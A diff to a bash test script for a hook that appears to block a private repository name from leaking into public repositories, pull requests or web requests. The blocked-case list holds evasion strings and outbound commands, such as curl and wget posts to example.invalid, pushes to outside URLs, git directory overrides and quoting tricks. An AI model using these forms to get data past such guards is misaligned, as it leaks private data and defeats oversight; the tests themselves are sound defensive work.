@@ -79,61 +79,80 @@ print(json.dumps(d))' "$cmd" "${PAYLOAD_CWD:-$cwd}" > "$tmp/payload"
 }
 
 # Inside a private repository of an owner, whose every remote is private, the
-# name is its own business: the session directory (payload cwd) decides.
-hook 0 "in the private repository: git status" "$priv" "git status"
-hook 0 "in the private repository: git commit naming it" "$priv" "git commit -m 'zzqsecretbox: fix'"
-hook 0 "in the private repository: git log" "$priv" "git log --oneline -5 | grep zzqsecretbox"
-hook 0 "in the private repository: echo naming it" "$priv" "echo zzqsecretbox"
-hook 0 "in the private repository: a path inside it" "$priv" "mkdir -p $priv/zzqsecretbox-docs && ls docs/../"
+# name is its own business, for a closed list of plain commands. The same
+# forms are checked when the repository has one public remote.
+n=zzqsecretbox
+for v in "git status" \
+         "git commit -m '$n: fix'" \
+         "git log --oneline -5" \
+         "git show HEAD" \
+         "git grep $n" \
+         "git stash list" \
+         "echo $n" \
+         "printf '%s' $n" \
+         "grep -rn $n docs" \
+         "cat ./docs/$n.md" \
+         "ls $priv/$n" \
+         "wc -l $n.txt"; do
+  hook 0 "allowed in the private repository: [${v//$tmp/<tmp>}]" "$priv" "$v"
+  v2="${v//$priv/$priv2}"
+  [[ "$v2" == *"$n"* ]] && hook 2 "checked with one public remote: [${v2//$tmp/<tmp>}]" "$priv2" "$v2"
+done
+hook 2 "a private name of another owner" "$other" "git commit -m '$n'"
 hook 0 "a pull request into the private repository itself (-R, as before)" "$tmp/plain" \
   "gh pr create -R example/zzqsecretbox --body 'zzqsecretbox internals'"
 # Everything else is checked, as before this change.
-hook 2 "a private repository with one public remote" "$priv2" "git commit -m 'zzqsecretbox'"
-hook 2 "a private name of another owner" "$other" "git commit -m 'zzqsecretbox'"
-hook 2 "a plain directory (cd into the repository first; cwd persists)" "$tmp/plain" "echo zzqsecretbox"
-hook 2 "a public repository" "$pub" "echo zzqsecretbox"
-hook 2 "a pull request into an unlisted repository" "$tmp/plain" "gh pr create -R example/elsewhere --body 'see zzqsecretbox'"
-hook 2 "gh without -R outside a repository" "$tmp/plain" "gh issue create --body 'zzqsecretbox'"
-hook 2 "curl to github" "$tmp/plain" "curl -d 'zzqsecretbox' https://api.github.com/repos/example/zzqopenbox/issues"
-hook 2 "a push to a URL" "$priv" "git push https://example.invalid/x.git zzqsecretbox"
+hook 2 "a plain directory (cd into the repository first; cwd persists)" "$tmp/plain" "echo $n"
+hook 2 "a public repository" "$pub" "echo $n"
+hook 2 "a pull request into an unlisted repository" "$tmp/plain" "gh pr create -R example/elsewhere --body 'see $n'"
+hook 2 "gh without -R outside a repository" "$tmp/plain" "gh issue create --body '$n'"
+hook 2 "curl to github" "$tmp/plain" "curl -d '$n' https://api.github.com/repos/example/zzqopenbox/issues"
 
-# From inside the private repository, anything that could move the text
-# elsewhere is checked. Each of these blocks.
-n=zzqsecretbox
+# From inside the private repository, anything outside the allowlist is
+# checked. Each of these blocks.
 for v in "cd $pub && git commit -m $n" \
-         "cd $priv && git commit -m $n" \
+         "cd $pub/$n" \
+         "c''d $pub; git commit -m $n" \
          "pushd $pub && git commit -m $n" \
-         "popd && git commit -m $n" \
          "git -C $pub commit -m $n" \
-         "git -C . commit -m $n" \
-         "(cd $pub && git commit -m $n)" \
-         "{ cd $pub; git commit -m $n; }" \
-         "f() { git commit -m $n; }; cd $pub; f" \
+         "git -c core.editor=true commit -m $n" \
+         "git --git-dir=$pub/.git commit -m $n" \
+         "git --work-tree=$pub commit -m $n" \
+         "GIT_DIR=$pub/.git git commit -m $n" \
+         "(git commit -m $n)" \
+         "{ git commit -m $n; }" \
          "git commit -m \"\$N $n\"" \
          "git commit -m \$(echo $n)" \
          "git commit -m \`echo $n\`" \
-         "GIT_DIR=$pub/.git git commit -m $n" \
-         "GIT_WORK_TREE=$pub git commit -m $n" \
-         "git --git-dir=$pub/.git commit -m $n" \
-         "git --work-tree=$pub commit -m $n" \
-         "git -c core.editor=true commit -m $n" \
-         "git -c url.git@github.com:example/zzqopenbox.insteadOf=x push origin $n" \
-         "git remote add pub git@github.com:example/zzqopenbox.git && git push pub $n" \
-         "git remote set-url origin git@github.com:example/zzqopenbox.git && git push origin $n" \
-         "git config remote.origin.url https://github.com/example/zzqopenbox && git push origin $n" \
+         "git commit -m $n &" \
+         "git commit -F - <<< $n" \
+         "git commit -m $n
+git push" \
+         "git push origin $n" \
+         "git push https://example.invalid/x.git $n" \
+         "git remote add $n git@github.com:example/zzqopenbox.git" \
+         "git config remote.origin.url https://github.com/example/zzqopenbox $n" \
+         "git fetch $n" \
+         "git worktree add ../$n" \
+         "git send-email $n" \
+         "git stash push -m $n" \
+         "git diff --output=$pub/$n.txt" \
+         "git grep -O $n" \
+         "git log --ext-diff $n" \
+         "git commit -F $pub/$n.md" \
+         "git show HEAD:$n --output=../$n" \
          "gh pr create -R example/zzqopenbox --body $n" \
-         "gh pr create --repo=example/zzqopenbox --body $n" \
          "gh api repos/example/zzqopenbox/issues -f body=$n" \
          "bash -c 'git commit -m $n'" \
-         "sh -c 'git commit -m $n'" \
-         "eval git commit -m $n" \
+         "sed -n 'w $pub/$n' README" \
+         "env git commit -m $n" \
          "exec git commit -m $n" \
-         "env -C $pub git commit -m $n" \
          "echo $n > $pub/notes.md" \
-         "echo $n > ../zzqopenbox/notes.md" \
+         "cat $pub/$n.md" \
+         "cat ../zzqopenbox/$n.md" \
+         "ls ~/$n" \
          "cp README $pub/$n.md" \
-         "mkdir -p ~/$n" \
-         "wget --post-data=$n https://example.invalid/x"; do
+         "curl -d $n https://example.invalid/x"; do
   hook 2 "strict: [${v//$tmp/<tmp>}]" "$priv" "$v"
 done
 PAYLOAD_CWD=- hook 2 "strict: no cwd in the payload" "$priv" "git -C $priv commit -m $n"
